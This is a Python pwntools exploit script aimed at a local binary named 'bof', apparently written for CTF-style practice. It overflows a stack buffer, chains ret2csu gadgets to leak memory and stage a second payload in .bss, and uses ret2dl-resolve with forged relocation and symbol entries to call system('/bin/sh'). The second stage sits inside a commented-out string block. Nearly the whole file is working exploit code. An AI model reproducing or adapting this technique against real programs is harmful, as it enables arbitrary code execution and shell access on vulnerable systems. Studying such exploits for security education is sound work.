from pwn import *
from struct import *
    
#context.log_level = 'debug'
elf = ELF('./bof')
  
# get section address
addr_dynsym     = elf.get_section_by_name('.dynsym').header['sh_addr']
addr_dynstr     = elf.get_section_by_name('.dynstr').header['sh_addr']
addr_relaplt     = elf.get_section_by_name('.rela.plt').header['sh_addr']
addr_plt        = elf.get_section_by_name('.plt').header['sh_addr']
addr_got    = elf.get_section_by_name('.got.plt').header['sh_addr']
addr_bss        = elf.get_section_by_name('.bss').header['sh_addr']
addr_got_read   = elf.got['read']
addr_got_write   = elf.got['write']
  
log.info('Section Headers')
log.info('.dynsym  : ' + hex(addr_dynsym))
log.info('.dynstr  : ' + hex(addr_dynstr))
log.info('.rela.plt : ' + hex(addr_relaplt))
log.info('.plt     : ' + hex(addr_plt))
log.info('.got     : ' + hex(addr_got))
log.info('.bss     : ' + hex(addr_bss))
log.info('read@got : ' + hex(addr_got_read))
log.info('write@got : ' + hex(addr_got_write))
  
addr_csu_init1 = 0x40060a       #  
addr_csu_init2 = 0x4005f0       #  
addr_leave_ret = 0x00400585 # leave; ret
addr_ret = 0x00400419       # ret
   
stacksize = 0x600
base_stage = addr_bss + stacksize
  
#write(1,addr_got+8,8)
buf1 = 'A' * 136
buf1 += p64(addr_csu_init1)
buf1 += p64(0)
buf1 += p64(1)
buf1 += p64(addr_got_write)
buf1 += p64(8)
buf1 += p64(addr_got+8)
buf1 += p64(1)
buf1 += p64(addr_csu_init2)
#read(0,base_stage,400)
buf1 += 'AAAAAAAA'
buf1 += p64(0)
buf1 += p64(1)
buf1 += p64(addr_got_read)
buf1 += p64(400)
buf1 += p64(base_stage)
buf1 += p64(0)
buf1 += p64(addr_csu_init2)
#JMP base_stage + 8
buf1 += 'AAAAAAAA'
buf1 += 'AAAAAAAA'
buf1 += p64(base_stage)     # rbp
buf1 += 'AAAAAAAA'
buf1 += 'AAAAAAAA'
buf1 += 'AAAAAAAA'
buf1 += 'AAAAAAAA'
buf1 += p64(addr_leave_ret)
 
#binary = ELF('./rop')
p = process(elf.path)
#sleep(20)
p.send(buf1)
gdb.attach(p) 
#Get address of addr_dt_versym
"""
addr_link_map = u64(p.read(8))
addr_dt_versym = addr_link_map + 0x1c8
 
addr_reloc = base_stage + 8*26
align_reloc = 24 - ((addr_reloc - addr_relaplt) % 24)
addr_reloc += align_reloc
align_dynsym = 24 - (( addr_reloc + 24 - addr_dynsym) % 24)
 
addr_fake_sym = addr_reloc + 24
addr_fake_sym += align_dynsym
addr_fake_symstr = addr_fake_sym + 24
addr_fake_cmd = addr_fake_symstr + 7
 
fake_reloc_offset   = (addr_reloc - addr_relaplt) / 24
fake_r_info = (((addr_fake_sym - addr_dynsym) / 24) << 32)    #FAKE ELF32_R_SYM
fake_r_info = fake_r_info | 0x7                             #FAKE ELF32_R_TYPE
fake_st_name = addr_fake_symstr - addr_dynstr
 
log.info('')
log.info('Fake Struct Information')
log.info('addr_csu_init1 :'+ hex(addr_csu_init1))
log.info('addr_got_read :'+ hex(addr_got_read))
log.info('addr_dt_versym :'+ hex(addr_dt_versym))
log.info('addr_csu_init2 :'+ hex(addr_csu_init2))
log.info('addr_ret :'+ hex(addr_ret))
log.info('base_stage + 8*9 :'+ hex(base_stage + 8*9))
log.info('addr_fake_cmd :'+hex(addr_fake_cmd))
  
#read(0,addr_dt_versym,8)
buf2 = 'AAAAAAAA'
buf2 += p64(addr_csu_init1)
buf2 += p64(0)
buf2 += p64(1)
buf2 += p64(addr_got_read)
buf2 += p64(8)
buf2 += p64(addr_dt_versym)
buf2 += p64(0)
buf2 += p64(addr_csu_init2)
#Setting argument values of system() function
buf2 += p64(addr_ret)
buf2 += p64(0)
buf2 += p64(1)
buf2 += p64(base_stage + 8*9)   #address of addr_csu_init2
buf2 += 'B' * 8
buf2 += 'B' * 8
buf2 += p64(addr_fake_cmd)  #"/bin/sh"
buf2 += p64(addr_csu_init2)
buf2 += 'C' * 0x38
#_dl_runtime_resolve(struct link_map *l, fake_reloc_offset)
buf2 += p64(addr_plt)
buf2 += p64(fake_reloc_offset)
buf2 += 'A' * align_reloc
# Elf64_Rela
buf2 += p64(addr_got_read)    
buf2 += p64(fake_r_info)
buf2 += p64(0)
buf2 += 'A' * align_dynsym
# Elf64_Sym
buf2 += p32(fake_st_name)          
buf2 += p32(0x12)
buf2 += p64(0)
buf2 += p64(0)
#String "system"
buf2 += 'system\x00'
#String "/bin/sh"
buf2 += '/bin/sh\x00'
  
#sleep(10)
p.send(buf2)
#sleep(10)
p.send(p64(0))
"""
p.interactive()
